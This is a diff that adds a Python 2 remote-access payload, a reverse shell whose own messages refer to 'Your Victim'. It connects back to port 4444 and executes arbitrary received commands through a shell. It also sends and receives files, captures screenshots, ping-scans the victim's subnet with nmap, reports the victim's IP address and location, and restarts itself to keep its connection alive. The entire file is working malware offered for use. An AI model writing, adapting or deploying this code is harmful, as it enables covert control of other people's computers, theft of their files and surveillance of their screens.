@@ -1,0 +1,127 @@
+
+#!/usr/bin/env python2
+import socket, subprocess,os,sys,random
+from time import sleep
+go=1
+try:
+	import nmap,pyscreenshot,requests
+	myerror=''
+except:
+	myerror='''[!] Your Victim need this modules ..
+	[1] Requests
+	[2] python-nmap
+	[3] pyscreenshot
+	-----------------
+	$ pip2 install requests
+	$ pip2 install python-nmap
+	$ pip2 install pyscreenshot
+	$ re() # for restart tha payload
+	$ restart your connection ..'''
+	go=0
+l=random.randint(1,100000)
+if go==1:
+	nm = nmap.PortScanner()
+def nmap(ip):
+    data = nm.scan(hosts=ip, arguments='-sP')
+    re= [ip for ip, result in data['scan'].iteritems() if result['status']['state'] == 'up']
+    for i in range(10):
+        try:
+            s.send(re[i])
+        except:
+            s.send('stop')
+            break
+def re():
+        python = sys.executable
+        os.execl(python, python, * sys.argv)
+        curdir = os.getcwd()
+try:
+	s = socket.socket()
+	s.connect(('localhost',4444)) 
+except:
+	re()
+s.send(myerror)
+try:
+        while True:
+                cmd = s.recv(1024)
+                if cmd[:2] == 'cd':
+                    try:
+                          os.chdir(cmd[3:])
+                          dir = os.getcwd()
+                          s.sendall('bacod')
+                    except:
+                          s.send('[!] File Not Found ..')
+		elif cmd[0:7] == 'netscan' and go==1:
+			s.send('get the ip')
+			ip=s.recv(1024)
+			nmap(ip+'/24')
+		elif 'print' in cmd:
+			print(cmd[5:])
+                elif cmd == 'download':
+                        s.send('name')
+                        file=s.recv(1024)
+                        try:
+                                while True:
+                                    f = open(file,'rb')
+                                    l = f.read(1000000)
+                                    while (l):
+                                        s.send(l)
+                                        l = f.read(1000000)
+                                    f.close()
+				    s.send('[+] Done ..')
+                                    break
+                        except:
+				s.send('|ERROR|')
+                                s.send('[-] ERROR ..')
+                elif cmd == 'upload':
+                        s.send('ok')
+			try:
+	                        if s.recv(1024) == 'name':
+	                                with open(str(l)+'.pyshell', 'wb') as f:
+	                                        while True:
+	                                                data = s.recv(100000000)
+	                                                # write data to a file
+	                                                f.write(data)
+							s.send('[+] Done ..')
+	                                                break
+			except:
+				s.send('|ERROR|')
+				s.send('[-] ERROR ..')
+                elif cmd == 'screenshot' and go==1:
+                        im = pyscreenshot.grab()
+                        name=str(l)+'.png'
+                        im.save(name)
+                        s.send('Taked : '+name)
+                elif cmd[0:4] == 're()':
+                                s.send(' ')
+                                s.close()
+                                sleep(1.5)
+				re()
+		elif cmd == 'address' and go==1:
+			try:
+	                        import requests
+	                        res = requests.get('https://ipinfo.io/')
+	                        data = res.json()
+	                        city = data['city'].encode('utf-8')
+	                        ip = data['ip'].encode('utf-8')
+	                        location = data['loc'].split(',')
+	                        latitude = location[0].encode('utf-8')
+	                        longitude = location[1].encode('utf-8')
+	                        re=('''
+IP : %s
+City : %s
+Longitude : %s
+Latitude : %s
+''') % (ip,city,longitude,latitude)
+	                        s.send(re)
+			except:
+	                		s.send('[!] Error ..')
+                else:
+                        results = subprocess.Popen(cmd, shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+                        results = results.stdout.read() + results.stderr.read()
+
+                        s.sendall(''+results)
+except:
+        s.close()
+        sleep(1.5)
+        re()
+
